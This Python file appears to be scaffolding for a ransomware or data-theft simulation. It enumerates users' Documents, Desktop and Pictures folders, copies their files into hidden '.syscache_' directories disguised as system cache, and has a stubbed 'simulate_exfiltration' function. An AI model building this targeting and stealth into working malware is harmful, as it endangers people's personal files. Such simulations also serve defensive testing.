# -*- coding: utf-8 -*-
import os, shutil, random
from pathlib import Path
from datetime import datetime

def simulate_exfiltration(file_path):
    return True

def get_automatic_targets():
    targets = []
    if os.name == 'nt': 
        user_path = Path(os.environ.get('USERPROFILE', 'C:/Users'))
        folders = ['Documents', 'Desktop', 'Pictures', 'Downloads']
        for folder in folders:
            path = user_path / folder
            try:
                if path.exists(): targets.append(path)
            except PermissionError: continue
    else:
        home_base = Path('/home')
        if home_base.exists():
            try:
                for user_dir in home_base.iterdir():
                    if user_dir.is_dir():
                        # On ajoute les chemins, mais on ne vérifie pas l'existence ici
                        # pour éviter le crash immédiat
                        targets.append(user_dir / 'Documents')
                        targets.append(user_dir / 'Desktop')
                        targets.append(user_dir / 'Pictures')
            except PermissionError:
                pass 
    return targets if targets else [Path('.')]

def create_stealth_backup(target_dir: Path):
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_dir = target_dir / f".syscache_{timestamp}_{random.randint(1000,9999)}"
        backup_dir.mkdir(exist_ok=True)
        mapping = {}
        for f in target_dir.glob("*"):
            if f.is_file():
                try:
                    bkp_path = backup_dir / f.name
                    shutil.copy2(f, bkp_path)
                    mapping[str(f)] = str(bkp_path)
                except PermissionError: continue
        return backup_dir, mapping
    except:
        return None, {}

def restore_files(mapping):
    for original, backup in mapping.items():
        try: shutil.copy2(backup, original)
        except: pass
